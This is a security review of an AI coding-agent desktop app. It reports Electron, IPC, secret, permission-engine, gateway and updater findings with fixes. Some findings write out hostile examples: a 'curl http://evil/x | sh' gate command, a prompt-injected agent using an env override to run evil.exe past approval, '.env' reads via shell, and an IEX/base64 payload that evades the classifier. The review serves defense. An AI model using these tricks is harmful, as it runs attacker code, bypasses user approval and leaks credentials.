# Ferry security review (B10)

Scope: whole repository — `apps/desktop` (main/preload/renderer), `apps/cli`, `packages/*`,
packaging, CI — against Ferry's threat model in `docs/SECURITY.md`. Review is code-reading only;
nothing was changed, nothing was committed. The referenced master-plan B10 brief is not present in
this checkout, so this review uses the checklist given in the review request plus `docs/SECURITY.md`.

## 10-line summary

1. Electron isolation is solid: `contextIsolation`, `sandbox`, `nodeIntegration:false`, webview off, IPC sender/frame/origin checks, narrow preload, strict CSP — verification tests exist.
2. Highest-risk finding: untrusted workspace config can execute code — `.ferry/config.json` `gateCommands` run unapproved after a delegation (`delegation.ts:105,159`).
3. `run_command` permission bypass: the approval/classifier sees only `command`, but the tool call's `env` can set `FERRY_SHELL`/`SYSTEMROOT`, executing an attacker-chosen binary under a benign-looking command (`tool-registry.ts:166`, `command.ts:59,202,248`).
4. Credential-path protection is not applied to shell commands or to delegation ACP file callbacks, so `.env`/`.npmrc`/`id_rsa` can still be read there.
5. Project config can loosen safety: `.ferry/config.json` `permissionMode` and `permissionRules` are applied without a trust hash and project rules override user rules.
6. Checkpoint snapshots (`git add -A`) can capture `.env` and other secrets into the shadow git store under user data.
7. Secrets otherwise behave: keyring-only store, DB holds only `keyringRef`, renderer never receives keys, redaction is wired into logs/events/errors (with gaps noted).
8. Delegation lane trust pinning is byte-hash based and correct; MCP project trust is safe-by-omission (project MCP is not loaded by the desktop domain).
9. Gateway is token-auth + constant-time compare + loopback by default, but LAN mode and CORS/Origin handling deserve hardening; core WebSocket is E2E-only and mostly well-guarded.
10. Unsigned auto-updates with `verifyUpdateCodeSignature` disabled are the main supply-chain exposure; `onlyBuiltDependencies` is a good install-script control.

## How this was verified

- Read all security-relevant sources (`apps/desktop/src/**`, `apps/cli/src/**`, `packages/{core,secrets,storage,oauth,gateway,delegate,extensions,workspace,agent,shared,config,providers,router,quota}/src/**`), metadata (`electron-builder.yml`, `nsis/installer.nsh`, `.github/workflows/*`, `.npmrc`, `pnpm-workspace.yaml`) and the existing security regression tests.
- `pnpm audit` was **not** run (sandbox has no network / no global pnpm; per `AGENTS.md`); the only audit evidence is the 2026-09-27 note in `docs/SECURITY.md`, which predates `electron-updater`.
- Findings labeled **[unverified]** were not reproduced at runtime; they follow from reading the code path.

Legend: severity **critical / high / medium / low / info**. Evidence is `file:line`.

---

## 1. Electron main / preload / renderer

### 1.1 Isolation, CSP, navigation, permissions — no material issues
- `webPreferences`: `contextIsolation:true`, `sandbox:true`, `nodeIntegration:false`, `webviewTag:false`, `devTools` off when packaged unless `FERRY_DEBUG_TOOLS=1` (`apps/desktop/src/main/index.ts:305-312`). No `enableBlinkFeatures`, no remote module.
- CSP: `script-src 'self'`, no `unsafe-eval`, `object-src 'none'`, `base-uri 'none'`, `form-action 'none'`, `frame-src 'none'` (`apps/desktop/src/renderer/index.html:8`). Inline styles remain (documented, needed for Monaco/runtime styles).
- New windows denied and `will-navigate`/`will-redirect` only allow the exact renderer URL; everything else goes through `openExternalSafely` (`index.ts:322-335`). `shell.openExternal` is only reachable after an HTTP(S) check and a host allowlist or a user confirmation dialog (`index.ts:184-201`). The regression test even asserts there is no unguarded `shell.openExternal(` call.
- All renderer permission requests denied (`index.ts:448-450`).

### 1.2 LOW — message `targetOrigin` is `'*'` for the file:// renderer
**Evidence:** `apps/desktop/src/preload/index.ts:88-91`; acceptance in `apps/desktop/src/shared/core-port-origin.ts:6`.
**Scenario:** the core MessagePort + single-use token is posted with `targetOrigin:'*'` because the file origin is opaque. It is the same window and the CSP has `frame-src 'none'`, so a hostile frame is not currently reachable; still, `'*'` is an avoidable footgun if a frame/webview is ever added.
**Fix:** keep the MessagePort handoff inside the main process, or deliver the port/ token via a contextBridge callback instead of `postMessage('*')`; if `postMessage` is kept, never include the token in the message body with a wildcard origin.
**Verification:** read; tests cover the origin predicate, not the wildcard.

### 1.3 LOW — trust predicate for file origins is broad
**Evidence:** `apps/desktop/src/main/renderer-origin.ts:7` accepts any `file:` URL with empty host.
**Scenario:** trust currently rests on the additional `event.sender === mainWindow.webContents` + main-frame checks in `isTrustedSender` (`index.ts:173-183`), so this is defense-in-depth only.
**Fix:** compare against the exact built renderer path (as `isTrustedRendererUrl` already does) and document why the two predicates differ.

### 1.4 LOW — only the permission *request* handler is installed
**Evidence:** `index.ts:448-450`. `setPermissionCheckHandler` is absent (grep found none).
**Scenario:** `navigator.permissions.query`/synchronous permission checks can report defaults rather than an explicit deny, though requests are still refused. Low impact because camera/mic/geo are unused.
**Fix:** also install `session.setPermissionCheckHandler(() => false)`.

### 1.5 INFO — CSP allows loopback WebSocket in production
**Evidence:** `index.html:8` `connect-src 'self' ws://127.0.0.1:*`. Used for E2E (`renderer/main.tsx:86-89`); not needed after the MessagePort bootstrap.
**Fix:** scope the ws allowance to the E2E build, or replace with a nonce/explicit dev origin.

### 1.6 INFO — renderer receives the core PID
**Evidence:** `index.ts:377-381` returns `pid`; `docs/SECURITY.md:29` says process details stay on the main/core boundary.
**Fix:** return only the status, or update the doc.

### 1.7 INFO — Markdown rendering is safe
`packages/ui/src/components/chat/MarkdownContent.tsx:128` uses `dangerouslySetInnerHTML`, but the HTML is Shiki output from code text (escaped); `react-markdown` is used without `rehype-raw`, and CSP blocks inline scripts. No XSS found.

---

## 2. IPC / preload surface

The exposed preload API is a fixed allowlist: `openFolder`, `getUpdateState`, `checkForUpdates`,
`setAutoDownload`, `installUpdate`, `downloadUpdate`, `onUpdateState`, `onOpenWorkspace`,
`updateTheme`, `connectCore`, `getEngineStatus`, `onEngineRestarting`, `onEngineConnected`,
`realDomainsFromEnvironment`, read-only `platform`/`versions`/`channel`/`commit`
(`apps/desktop/src/preload/index.ts:19-120`). There is no generic `invoke`/`send` bridge.

- Every `ipcMain.handle` recalculates trust and validates arguments: `EmptyIpcArgsSchema`, `CoreHandoffTokenSchema`, `DesktopThemeSchema`, and an explicit boolean check for auto-download (`index.ts:355-433`; schemas in `packages/shared/src/security/desktop-ipc.ts`).
- `ferry:connect-core` tokens are single-use per process and schema-checked (`index.ts:367-376`); the port is only handed over after a trusted-frame check.
- **LOW [unverified]**: `openFolder` returns the native-dialog path unchanged (`index.ts:361-364`); core paths/process details are otherwise kept off the renderer boundary, consistent with `SECURITY.md:29`.
- **LOW**: `--open-folder`/`second-instance` workspace paths come from `process.argv` and are forwarded to the renderer without canonicalization (`index.ts:68-82,395-403`). A malicious shortcut could make Ferry open an attacker repo, but opening a workspace is a user-visible action and the path is re-validated by `WorkspaceJail` on use.
- **INFO**: the regression test asserting handler counts (`security.test.ts:59-81`) is brittle but effective as a tripwire.

No IPC input-validation or sandbox-escape issue found.

---

## 3. Secrets

### 3.1 Keyring-only storage — verified good
- Default store is `KeyringSecretStore` (OS keyring); `MemorySecretStore` is only selected in tests or unpackaged dev mode (`packages/core/src/services.ts:132-144`). Packaged core env strips `FERRY_*` overrides (`apps/desktop/src/main/core-environment.ts:37-45`; test at `security.test.ts:13-34`), so the memory keyring cannot be forced in production.
- SQLite stores only `keyring_ref`, never key material (`packages/storage/src/schema.ts:10-15`).
- Provider events emit a `Provider` record without secrets; keys are read from the store only at request time (`packages/core/src/domains/providers.ts:146-172,192-207`).
- Header redaction blanks `authorization`/`api[-_]?key`/`token`/`secret`/`password` and bearer/known key shapes before persisting (`packages/storage/src/index.ts:351-373`).

### 3.2 MEDIUM — secret redaction has coverage gaps
**Evidence:** known-value redaction depends on an in-memory registry seeded when a secret passes through the store (`packages/shared/src/security/secrets.ts:1-36`); pattern redaction is a prefix list (`packages/config/src/index.ts:264-271`); the pino transport redacts a fixed set of paths, not arbitrary nested key names (`config/src/index.ts:204-218`); and `mapError` redacts only `error.details`, not `error.message` (`packages/core/src/host.ts:59-66`).
**Scenario:** any secret that reaches a log/error/event before passing through a `SecretStore` (e.g. a domain error message containing a provider key, or an error thrown while constructing the store) can be written verbatim. Custom provider key formats are not recognized by the prefix list. The QA test at `packages/config/test/qa-config.test.ts:147-158` already flags prefix gaps.
**Fix:** redact `error.message` in `mapError`/`writeFailure`; expand pattern coverage or (better) add a `SecretStore`-backed redaction stream that the logger consults; add explicit redaction at every log/emit boundary that can carry provider payloads.
**Verification:** read; core regression coverage for the existing paths is described in `SECURITY.md:48-50`.

### 3.3 MEDIUM — credential files enter checkpoint snapshots
**Evidence:** `ShadowCheckpoints.snapshot` runs `git add -A` on the whole work-tree without the `isProtectedWorkspacePath` filter (`packages/workspace/src/git.ts:47-63`).
**Scenario:** in a workspace where `.env` is not git-ignored, the first mutating tool or delegation snapshots `.env` (and `.npmrc`, `id_rsa`, etc.) into `$FERRY_HOME/checkpoints/<hash>`. The contents can then surface through `checkpoints.diff`/`restore` into the transcript, UI, or model context — defeating the file-tool credential denial.
**Fix:** exclude protected paths (and `.git/`, `node_modules/`) from `git add`; add a regression test that `.env` never appears in a checkpoint tree.
**Verification:** read; not reproduced against a live workspace.

### 3.4 LOW — OAuth `openUrl` bypasses the desktop URL guard
**Evidence:** core `openUrl` shells out via `execFile('rundll32.exe', ['url.dll,FileProtocolHandler', url])` / `xdg-open` / `open` (`packages/core/src/domains/oauth.ts:14-28`), while the Electron guard (`index.ts:184-201`) is never in this path.
**Scenario:** a compromised/malicious OAuth provider entry could request opening a non-HTTP scheme or `file:` URL. Arguments are array-passed (no shell injection), but arbitrary protocol handlers can be launched.
**Fix:** restrict `auth_url` to `https:` and route through the same allowlist/confirmation as renderer links.

---

## 4. Permission engine bypasses

### 4.1 HIGH — `run_command` `env` is outside the permission decision
**Evidence:** the tool exposes only `command` to the evaluator (`packages/agent/src/tool-registry.ts:163-167,225-235`); the command schema accepts arbitrary `env` (`tool-registry.ts:92-99`); `runCommand` merges that env over the allowlisted environment (`packages/workspace/src/command.ts:56-60`) and uses it to choose the shell (`command.ts:60,248-266`) and to locate `taskkill.exe` (`command.ts:202-204`).
**Scenario:** a prompt-injected model calls `run_command { command: "echo hello", env: { FERRY_SHELL: "C:\\Users\\me\\evil.exe" } }`. `classifyDangerousCommand("echo hello")` returns nothing, so in `full_auto` the action is allowed, and `evil.exe -lc "echo hello"` runs. `SYSTEMROOT` similarly redirects the timeout/abort `taskkill.exe` lookup to an attacker binary. In `ask`/`auto_edit` the approval dialog shows only `command`, so the user approves a benign-looking action.
**Fix:** treat `env`, `pty`, `cwd` as part of the permission action; reject `FERRY_SHELL` and shell/executable-affecting overrides from tool input; resolve the shell from a fixed allowlist (not model input); include the full args in the approval detail.
**Verification:** read; not executed.

### 4.2 HIGH/MEDIUM — credential reads via shell and ACP, bypassing file-tool protection
**Evidence:** `run_command` has no `path` permission hook, so `type .env` / `Get-Content .env` is not screened by `isProtectedWorkspacePath` (only `evaluatePermission`'s command classifier runs; `tool-registry.ts:166`); the ACP read callback also skips credential checks (`packages/delegate/src/index.ts:840-843`), and ACP writes are only gated by the lane's `scoped_write`/`paths` (`index.ts:844-857`).
**Scenario:** in `full_auto`, `run_command "Get-Content .env"` reads credentials with no prompt; a delegation `read_only` lane lets the delegated CLI read `.env` inside the workspace (and thus send it to its provider). Both contradict the intent stated in `SECURITY.md:37-38`.
**Fix:** add best-effort protected-name detection to shell commands and hard-deny matches; apply `isProtectedWorkspacePath` to ACP read/write targets as the file tools do.
**Verification:** read; not executed.

### 4.3 LOW — classifier gaps in `classifyDangerousCommand`
**Evidence:** `packages/workspace/src/permissions.ts:28-51`. The shell-chaining/expansion guard is broad (`permissions.ts:55`), and rules were hardened for `pwsh`, `.env.*`, `del /q /s`, `rm -r -f`, and `Remove-Item ... ..` (the "BUG" comments in `packages/workspace/test/qa-workspace.test.ts:281-321` appear stale relative to the current rules).
Remaining gaps:
- A lone `Invoke-Expression`/`IEX` with a base64 payload is not flagged; `permissions.ts:35,44` require `iwr`/`Invoke-WebRequest` to also appear. `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...')))` contains no `;`, `|`, `&&`, or `$` and passes.
- Env expansion rule `permissions.ts:47` also matches a bare `$word`, producing false positives (not a bypass).
**Fix:** flag any `Invoke-Expression`/`IEX`/`-EncodedCommand`/`FromBase64String` combination; treat PowerShell encode/decode primitives as dangerous on their own.
**Verification:** read.

### 4.4 MEDIUM — project permission config is trusted
**Evidence:** `.ferry/config.json` is read with no approval (`packages/core/src/domains/sessions.ts:467,507-509,576-582`); project rules are applied at `level:'project'` and sorted to override user rules (`packages/workspace/src/permissions.ts:100-113`), and project `permissionMode` is used whenever the global setting is absent (`sessions.ts:477-509`).
**Scenario:** a hostile repository sets `"permissionMode":"full_auto"` (effective when no global mode was saved) and/or `"permissionRules":[{"pattern":"*","mode":"allow"}]`, weakening the user's chosen protections for that workspace. Dangerous commands are still caught by the classifier, but read/write/approval behavior is relaxed.
**Fix:** never let project config increase privilege over the user's mode (clamp), and require a config-hash approval like delegation lanes (`packages/delegate/src/index.ts:118-139`) before applying project rules/mode.
**Verification:** read.

### 4.5 MEDIUM — project `gateCommands` execute without approval
**Evidence:** `packages/core/src/domains/delegation.ts:105` reads gate commands from the workspace `.ferry/config.json`; `:159-171` runs each with `runCommand` and no `evaluatePermission`, no mode check, and no trust hash. The only project-config approval in this area covers `.delegate/config.json` (`delegate/index.ts:128-133`), not `.ferry/config.json`.
**Scenario:** user opens a malicious repo and runs a delegation (using a global lane, or after approving the repo's delegation lanes). On completion Ferry executes attacker commands (`"gateCommands": ["curl http://evil/x | sh"]` style or any script) with the core's filesystem/network privileges, outside every permission gate. A `git pull` that alters `.ferry/config.json` also changes them silently.
**Fix:** do not execute project-defined commands implicitly. Either hash-approve `.ferry/config.json` like delegate/MCP configs, or route every gate command through the active permission engine (which would deny shell chaining in `full_auto`), and show them before running.
**Verification:** read; no test covers gate-command trust.

---

## 5. Delegation argument injection, lane trust, MCP trust

### 5.1 Lane trust pinning — correct
Project lanes are trusted only for the exact SHA-256 of the config bytes; any change invalidates approval (`packages/delegate/src/index.ts:126-137`), and core stores the approval under a canonicalized path key with legacy migration (`packages/core/src/domains/delegation.ts:42-58,74-84`). `delegation.start` refuses untrusted lanes (`delegation.ts:100-101`).

### 5.2 MEDIUM — `.cmd`/`.bat` shim argument handling relies on a weak denylist
**Evidence:** `assertSafeArguments` only rejects operators when surrounded by whitespace and only for `;`, `&&`, `||`, `|`, `<`, `>`, `^`, `%`, `!` (`packages/delegate/src/index.ts:490-497`); shim launches build a single verbatim `cmd.exe /c "..."` string (`index.ts:1028-1054`), with each argument quoted and embedded quotes doubled.
**Scenario:** args such as `a&b`, `a||b`, `%COMSPEC%`, or values with no surrounding spaces are not rejected. Today the callers feed lane-configured args (trusted) and library-generated model/session values, so exploitability is limited, but a future untrusted arg source would be injection into `cmd.exe`.
**Fix:** avoid `cmd.exe /c` string assembly; use an argument-array launcher or a robust `cmd` escaper (`^`-escaping) and reject all shell metacharacters regardless of surrounding whitespace. Show resolved executable+args in any approval prompt.
**Verification:** read.

### 5.3 MCP trust prompts — safe by omission, prompt not implemented
`loadMcpServerConfigs` requires an `approveProjectConfig(hash)` callback and defaults to rejecting project servers when absent (`packages/extensions/src/mcp.ts:95-107`). The core domain never passes a `projectConfigPath` or `approveProjectConfig` (`packages/core/src/domains/mcp.ts:10-26`), matching `SECURITY.md:41`. Consequence: project MCP config is inert (no risk), but there is no UI trust prompt. User-level stdio MCP servers from `settings` do execute arbitrary commands, which is intended for user-owned config.
**Fix (backlog):** wire the hash-based approval prompt for project MCP to match delegate lanes.
**Verification:** read; unverified UI.

---

## 6. Gateway

### 6.1 GOOD
- Auth is required on `/v1/models` and both completion routes; keys are stored as SHA-256 hashes (`packages/gateway/src/index.ts:91,101-134`) and compared with `timingSafeEqual` (`:122-134`). Revoked keys are rejected.
- Loopback bind by default (`:700`), 8 MiB body cap (`:228-241`), per-key 60s rate limit (`:745-761`), `cache-control: no-store`, and error messages redact the provider key before rethrowing (`packages/core/src/gateway.ts:312-313`).
- The CLI daemon passes `canonicalizePath` data dirs as separate argv entries (`apps/cli/src/gateway.ts:47-65`).

### 6.2 MEDIUM — LAN mode + missing Origin/CORS policy
**Evidence:** `allowLan:true` binds `0.0.0.0` with no warning or IP allowlist (`gateway/src/index.ts:699-700`, `core/src/gateway.ts:333-336,376-384`); requests are not filtered by `Origin` and no CORS headers are set.
**Scenario:** if the user enables LAN mode, any host on the network with a valid gateway key can spend the user's provider accounts; a malicious local web page cannot read responses (no CORS) but could still fire authenticated requests if a token leaked. There is no brute-force/IP throttle for invalid keys on the gateway (unlike the core WebSocket).
**Fix:** require explicit confirmation for LAN mode, set a restrictive `Access-Control-Allow-Origin`, reject cross-origin browser requests, and add per-IP throttling for failed auth.
**Verification:** read.

### 6.3 LOW — unauthenticated `/health`, unthrottled `/v1/models`, unbounded rate map
**Evidence:** `:704-707` (`/health` open — acceptable), `:708-737` (models list not rate-limited), `requestTimes` never evicts stale keys (`:701,747-760`).
**Fix:** rate-limit `/v1/models`; periodically prune `requestTimes`.

### 6.4 LOW — EADDRINUSE fallback can hang
**Evidence:** `startGateway` removes the `listening` listener before retrying on port 0 (`gateway/src/index.ts:773-791`), so the readiness promise may never resolve.
**Fix:** re-attach the listener (or restructure the retry). Availability only.

---

## 7. Core transport / WebSocket

- Binds explicitly to `127.0.0.1` (`packages/core/src/websocket.ts:170`), fresh 256-bit bearer per start (`:46`), constant-time compare (`:74`), any `Origin` header rejected (`:78`), lockout after 5 bad tokens per address (`:48-49,73-77`), and request size capped at 1 MB (`:107-117`). In the desktop it is enabled only under `FERRY_E2E_WEBSOCKET=1` (`apps/desktop/src/main/core-entry.ts:26`).
- **LOW:** the WebSocket framing is hand-rolled; after auth, a client can keep a `pending` buffer growing until a declared frame completes, with no total-buffer cap. **Fix:** cap buffered bytes and close on abuse.
- **LOW:** the bearer token is carried in the query string (`websocket.ts:179`) and is included in the `ferry:core-ready` message/log path (`core-entry.ts:63`). Loopback/E2E only; prefer a header or the MessagePort handshake.
- **LOW:** `mapError` does not redact `error.message` (see 3.2).

---

## 8. Auto-updater, installer, dependencies

### 8.1 MEDIUM — unsigned updates with signature verification disabled
**Evidence:** `autoUpdater.verifyUpdateCodeSignature = () => Promise.resolve(null)` (`apps/desktop/src/main/index.ts:444`); `win.signAndEditExecutable:false` (`apps/desktop/electron-builder.yml:80`); the feed is build-pinned to GitHub `sico-vibes/ferry` via publish config (`electron-builder.yml:3-8`) and there is no runtime `setFeedURL`, so URL pinning and HTTPS-TLS are intact.
**Scenario:** without a publisher signature, anyone who can influence the HTTPS response (GitHub account/CI compromise, corporate TLS inspection with a trusted CA, local proxy) can serve a malicious `latest.yml`/installer and the updater accepts it. Auto-download is on by default and checked every 6 h (`index.ts:439-446`).
**Fix:** sign releases and stop clearing `verifyUpdateCodeSignature` (gate it behind an explicit dev flag only); consider pinning an expected publisher/SHA-512; keep updates user-initiated by default.
**Verification:** read; documented as intentional in `SECURITY.md:58-67`.

### 8.2 Installer — good
`perMachine:false`, `allowElevation:false`, fixed install dir (`electron-builder.yml:85-96`). PATH edit is opt-in, `HKCU`, and appends `"$INSTDIR\resources\cli"`; the Explorer context-menu command quotes both the exe and `"%1"` (`nsis/installer.nsh:29-51`). Uninstall removes only what it added and deletes user data only if the user opts in (`:81-101`).
**LOW:** the uninstall delete targets `$APPDATA\Ferry` / `$APPDATA\@ferry\desktop` literally; if the user's data lives elsewhere it is not cleaned (privacy hygiene, not a security hole).

### 8.3 Dependencies / supply chain
- `onlyBuiltDependencies` restricts install scripts to a known set (`pnpm-workspace.yaml:4-12`); `.npmrc` sets `package-import-method=copy`.
- CI installs with `--frozen-lockfile` and runs `pnpm check` before packaging (`beta.yml:32-36`, `release.yml:25-29`), and publishes via `GITHUB_TOKEN` with draft/prerelease gating.
- **INFO [unverified]:** `pnpm audit --prod` could not be run here. `docs/SECURITY.md:52-56` records a clean 2026-09-27 run that predates `electron-updater`; re-run the audit and add a CI audit gate.

---

## 9. OAuth flows

- The actual OAuth state/PKCE/device-code mechanics live in `@earendil-works/pi-ai`, not Ferry ([unverified] Ferry does not implement or override them). Ferry's own responsibilities:
  - Tokens are stored in the keyring and registered for redaction (`packages/oauth/src/index.ts:149-223,440-445,468-490`).
  - Subscription risk is surfaced: `RISK_TEXT` (ban/suspension) and `riskLevel:'high'` (`oauth/src/index.ts:62-63,249-260`), the CLI requires an explicit confirmation or `--i-understand-the-risk` for non-interactive high-risk logins (`apps/cli/src/main.tsx:737-758`), and the desktop shows `riskText` (`apps/desktop/src/renderer/app/OAuthProviderRows.tsx`).
  - `logout` deletes the keyring entry and forgets redaction values (`oauth/src/index.ts:501-514`).
- **LOW:** Radius gateway URL validation only enforces `http(s)` and no embedded credentials (`oauth/src/index.ts:137-142`); it does not require HTTPS or warn that tokens go to a third party (the UI does show a trust note). Prefer requiring `https:`.
- **LOW:** `openUrl` bypasses the desktop link guard (see 3.4).

---

## 10. Prioritized fix list

1. **HIGH — Stop executing project `.ferry/config.json` `gateCommands` without approval** (`core/src/domains/delegation.ts:105,159`). Hash-approve the config and/or route gates through `evaluatePermission`; add a regression test.
2. **HIGH — Bring `run_command` `env`/`cwd`/`pty` into the permission decision** (`agent/src/tool-registry.ts:166,229`; `workspace/src/command.ts:59-60,248-266`). Reject `FERRY_SHELL` and shell-affecting env; show full args in approvals.
3. **HIGH/MEDIUM — Apply credential-path protection to shell commands and ACP file callbacks** (`agent/src/tool-registry.ts:166`; `delegate/src/index.ts:840-857`).
4. **MEDIUM — Make project permission config untrusted** (`core/src/domains/sessions.ts:467,507-509,576-582`): clamp project mode to the user's, require hash approval for project rules.
5. **MEDIUM — Exclude protected files from checkpoint snapshots** (`workspace/src/git.ts:47-63`).
6. **MEDIUM — Sign releases / restore update signature verification** (`main/index.ts:444`; `electron-builder.yml:80`).
7. **MEDIUM — Harden the gateway LAN mode and Origin/CORS policy; throttle bad auth** (`gateway/src/index.ts:700,738-761`).
8. **MEDIUM — Redact `error.message`, not just `error.details`** (`core/src/host.ts:59-66`).
9. **LOW/MEDIUM — Strengthen `assertSafeArguments`/shim invocation and add PowerShell decode/IEX rules** (`delegate/src/index.ts:490-497,1028-1054`; `workspace/src/permissions.ts:28-51`).
10. **LOW — Defense-in-depth hardening:** `setPermissionCheckHandler`, exact-origin MessagePort handoff, tighten file-origin trust predicate, drop the `ws://127.0.0.1:*` CSP allowance in production, cap WebSocket buffers, prune gateway rate state, fix the gateway bind-retry hang, require `https:` for Radius.
11. **INFO — Re-run `pnpm audit --prod` and add it to CI**, then update `docs/SECURITY.md`.

### Overall
The Electron boundary, keyring-based secret storage, lane/MCP hash trust, and the core WebSocket server are implemented with care and covered by focused regression tests. The material risks concentrate in the *agent execution layer* — where workspace-controlled config and tool-call `env` can sidestep the permission engine — and in the intentionally unsigned update channel. Fixing items 1–3 removes the realistic remote/workspace-to-code-execution paths; items 4–6 close the remaining privilege-escalation and integrity gaps.
